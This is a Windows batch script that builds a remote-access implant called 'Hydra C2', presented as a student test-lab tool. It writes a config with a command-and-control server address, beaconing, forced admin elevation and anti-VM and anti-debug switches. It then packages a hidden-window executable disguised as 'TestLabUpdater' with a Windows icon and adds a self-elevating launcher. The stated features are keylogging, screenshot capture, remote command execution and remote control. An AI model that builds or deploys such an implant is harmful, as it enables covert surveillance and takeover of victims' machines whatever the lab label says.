@echo off
echo.
echo Hydra C2 Test Lab Implant Builder
echo ================================
echo Building student test lab implant for cybersecurity course...
echo.

REM Set Python executable
set PYTHON_EXE=python

REM Check if Python is available
%PYTHON_EXE% --version >nul 2>&1
if %errorLevel% neq 0 (
    echo Error: Python not found. Please install Python 3.7+ or set correct path.
    exit /b 1
)

REM Install required dependencies if needed
echo Checking dependencies...
%PYTHON_EXE% -m pip install -q pyinstaller pillow pynput pywin32 pyautogui websockets cryptography psutil

REM Set environment variables for the build
set PYTHONOPTIMIZE=2
set IMPLANT_CONFIG=LAB

REM Create a build directory if it doesn't exist
if not exist "build\" mkdir build

REM Create a configuration file specifically for test lab
echo Creating test lab configuration...
(
echo """
echo Configuration for Test Lab Implant
echo """
echo.
echo import os
echo.
echo # C2 server connection details - CONFIGURED FOR TEST LAB
echo SERVER_URL = "wss://10.211.55.5:8443/ws/dashboard"
echo PSK = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"  # Pre-shared key for authentication
echo.
echo # Network settings
echo CONNECTION_TIMEOUT = 10  # Connection timeout in seconds
echo RETRY_INTERVAL = 5  # Retry interval in seconds
echo MAX_RETRIES = 3  # Maximum number of connection retries
echo.
echo # Client configuration
echo BEACON_INTERVAL = 10  # Seconds between beacons for lab environment
echo JITTER = 0.2  # Random jitter factor (0.0 to 1.0)
echo.
echo # Test Lab setting - force admin elevation automatically
echo FORCE_ELEVATION = True
echo.
echo # Disable most anti-analysis for lab
echo ANTI_VM_ENABLED = False
echo ANTI_DEBUG_ENABLED = False
echo SANDBOX_SLEEP = 0
) > "build\lab_config.py"

REM Copy the lab config to the right location
echo Configuring for test lab environment...
copy /Y "build\lab_config.py" "hydra_client\config.py" >nul

echo Building the test lab implant executable...
%PYTHON_EXE% -m PyInstaller --clean --onefile --noconsole ^
    --add-data "build\lab_config.py;." ^
    --name "TestLabUpdater" ^
    --icon "windows.ico" ^
    --hidden-import websockets ^
    --hidden-import asyncio ^
    --hidden-import pynput.keyboard ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import pyautogui ^
    --hidden-import psutil ^
    --hidden-import PIL.Image ^
    main.py

REM Create a self-elevating launcher if needed
echo Creating self-elevating launcher...
(
echo @echo off
echo setlocal enabledelayedexpansion
echo.
echo REM Check if running as admin
echo net session >nul 2>&1
echo if %%errorLevel%% NEQ 0 (
echo    echo Requesting administrative rights...
echo    powershell -Command "Start-Process -Verb RunAs -FilePath '%%~dp0TestLabUpdater.exe'"
echo    exit /b 0
echo ) else (
echo    start "" "%%~dp0TestLabUpdater.exe"
echo )
) > "dist\Run_Updater.bat"

echo.
echo Build completed successfully!
echo.
echo Output files:
echo   - dist\TestLabUpdater.exe (Main implant executable)
echo   - dist\Run_Updater.bat (Self-elevating launcher)
echo.
echo IMPORTANT INSTRUCTIONS FOR STUDENTS:
echo ------------------------------------
echo 1. Copy both files to your test lab environment
echo 2. Double-click "Run_Updater.bat" to execute the implant with proper permissions
echo 3. The implant will silently connect back to the C2 server (10.211.55.5:8443)
echo.
echo The implant includes the following features:
echo  - Keylogging
echo  - Screenshot capture
echo  - Remote command execution
echo  - Remote control
echo.
pause 